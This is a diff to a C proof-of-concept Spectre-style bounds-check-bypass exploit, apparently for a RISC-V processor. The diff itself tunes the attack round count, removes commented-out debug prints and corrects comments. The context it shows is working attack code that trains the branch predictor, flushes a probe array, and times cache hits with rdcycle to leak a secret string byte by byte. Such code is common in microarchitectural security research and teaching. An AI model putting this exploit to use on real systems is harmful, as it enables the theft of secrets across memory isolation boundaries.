@@ -5,7 +5,7 @@
 
 #define TRAIN_TIMES 6 // assumption is that you have a 2 bit counter in the predictor
 #define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
-#define ATTACK_SAME_ROUNDS 20 // amount of times to attack the same index
+#define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
 #define SECRET_SZ 26
 #define CACHE_HIT_THRESHOLD 50
 
@@ -79,7 +79,6 @@ int main(void){
     uint64_t start, diff, passInIdx, randIdx;
     uint8_t dummy = 0;
     static uint64_t results[256];
-    //printf("Array1 at (0x%p), Secret at (0x%p), Subtraction (%d)\n", array1, secretString, attackIdx);
 
     // try to read out the secret
     for(uint64_t len = 0; len < SECRET_SZ; ++len){
@@ -96,14 +95,14 @@ int main(void){
             flushCache((uint64_t)array2, sizeof(array2));
 
             for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
-                // bit twiddling to set passInIdx=TRAIN_IDX or to attackIdx after TRAIN_TIMES iterations
+                // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
                 // avoid jumps in case those tip off the branch predictor
                 // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
                 //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
                 randIdx = atkRound % array1_sz;
                 passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                 passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
-                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select TRAIN_IDX or attackIdx 
+                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 
 
                 // set of constant takens to make the BHR be in a all taken state
                 for(uint64_t k = 0; k < 30; ++k){
@@ -122,7 +121,6 @@ int main(void){
                 diff = (rdcycle() - start);
                 if ( diff < CACHE_HIT_THRESHOLD ){
                     results[i] += 1;
-                    //printf("hit idx(%lu)\n", i);
                 }
             }
         }
